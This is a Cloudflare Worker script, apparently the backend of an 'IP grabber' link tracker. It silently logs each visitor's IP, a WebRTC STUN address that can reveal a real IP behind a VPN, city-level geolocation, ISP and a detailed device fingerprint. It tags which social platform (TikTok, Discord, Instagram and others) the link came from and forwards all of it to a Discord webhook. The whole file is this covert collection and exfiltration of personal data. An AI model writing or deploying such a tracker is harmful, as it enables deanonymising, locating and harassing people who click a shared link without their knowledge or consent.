export default {
  async fetch(request, env) {
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, X-Auth",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: corsHeaders });
    }

    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405, headers: corsHeaders });
    }

    const ip = request.headers.get("CF-Connecting-IP") || "Unknown";
    const source = request.headers.get("Origin") || "Unknown Source";
    const ua = request.headers.get("user-agent") || "Unknown";
    const now = new Date();
    const formattedDate = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris" });

    // Infos Cloudflare
    const country = request.cf?.country || "Unknown";
    const city = request.cf?.city || "Unknown";
    const asn = request.cf?.asn || "Unknown";
    const asOrg = request.cf?.asOrganization || "Unknown";

    // Rate limit par IP
    const lastActivityRaw = await env.LOGS.get(`last_${ip}`);
    if (lastActivityRaw) {
      const lastTimestamp = parseInt(lastActivityRaw);
      if (Date.now() - lastTimestamp < 60 * 60 * 1000) {
        return new Response("Too Many Requests", { status: 429, headers: corsHeaders });
      }
    }

    await env.LOGS.put(`last_${ip}`, `${Date.now()}`);
    const key = `log_${Date.now()}`;

    let deviceInfo = {};
    try {
      const body = await request.json();
      deviceInfo = body.deviceInfo || {};
    } catch (e) {
      // nothin to do
    }

    const platform = deviceInfo.platform || "Unknown";
    const browser = (() => {
      if (/chrome/i.test(deviceInfo.userAgent)) return "Chrome";
      if (/firefox/i.test(deviceInfo.userAgent)) return "Firefox";
      if (/safari/i.test(deviceInfo.userAgent) && !/chrome/i.test(deviceInfo.userAgent)) return "Safari";
      if (/edge/i.test(deviceInfo.userAgent)) return "Edge";
      return "Unknown";
    })();
    const os = platform;
    const device = platform;
    const timezone = deviceInfo.timezone || "Unknown";
    const gpu = deviceInfo.gpu || "Unknown";
    const language = deviceInfo.language || "Unknown";
    const cores = deviceInfo.cores || "Unknown";
    const memoryGB = deviceInfo.memoryGB || "Unknown";
    const screenResolution = deviceInfo.screenResolution || "Unknown";
    const viewport = deviceInfo.viewport || "Unknown";
    const stun_ip = deviceInfo.stun_ip || "Unknown";
    let source_link = deviceInfo.source_deviceInfo || "Unknown";
    if (source_link==="tk"){
      source_link = "[Tiktok](https://tiktok.com/)";}
    else if (source_link==="ig"){
      source_link = "[Instagram](https://instagram.com/)";}
    else if (source_link==="dc"){
      source_link = "[Discord](https://discord.com/)";}
    else if (source_link==="yt"){
      source_link = "[Youtube](https://youtube.com/)";}
    else if (source_link==="x"){
      source_link = "[X](https://x.com/)";}
    else if (source_link==="fb"){
      source_link = "[Facebook](https://facebook.com/)";}
    else if (source_link==="rd"){
      source_link = "[Reddit](https://reddit.com/)";}
    else if (source_link==="sc"){
      source_link = "[SnapChat](https://snapchat.com/)";}
    else if (source_link==="tg"){
      source_link = "[Telegram](https://web.telegram.org/)";}
    else if (source_link==="wa"){
      source_link = "[WhatsApp](https://web.whatsapp.com/)";}
    else if (source_link==="gh"){
      source_link = "[Github](https://github.com/)";}
    else if (source_link==="pt"){
      source_link = "[Pinterest](https://pinterest.com/)";}
    else if (source_link==="ln"){
      source_link = "[LinkedIn](https://linkedin.com/)";}

    await env.LOGS.put(key, JSON.stringify({ 
      ip, stun_ip, time: formattedDate, source, country, city, asn, asOrg, ua,
      platform, os, device, browser, timezone, gpu, language, cores, memoryGB, screenResolution, viewport
    }));

    await fetch("https://discord.com/api/webhooks/<webhook_id>/<webhook_token>", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        avatar: "https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png",
        username: "Website tracker By ABGACHE",
        embeds: [
          {
            title: "📌 New activity in the website",
            color: 918770,
            description: `-# Made by [abgache](https://abgache.ink/)\n- **IP :** \`${ip}\`
- **WebRTC STUN IP :** \`${stun_ip}\`
- **Hour :** ${formattedDate}
- **Source :** \`${source}\`
- **Country :** ${country}
- **City :** ${city}
- **ASN :** ${asn}
- **Organization :** ${asOrg}
- **User-Agent :** \`${ua}\`
- **Platform :** ${platform}
- **OS :** ${os}
- **Device :** ${device}
- **Browser :** ${browser}
- **Timezone :** ${timezone}
- **GPU :** ${gpu}
- **Langue :** ${language}
- **Cores :** ${cores}
- **RAM (GB) :** ${memoryGB}
- **Screen :** ${screenResolution}
- **Viewport :** ${viewport}
- **Platform Id :** ${source_link}`
          }
        ]
      })
    });

    return new Response("OK", { status: 200, headers: corsHeaders });
  }
};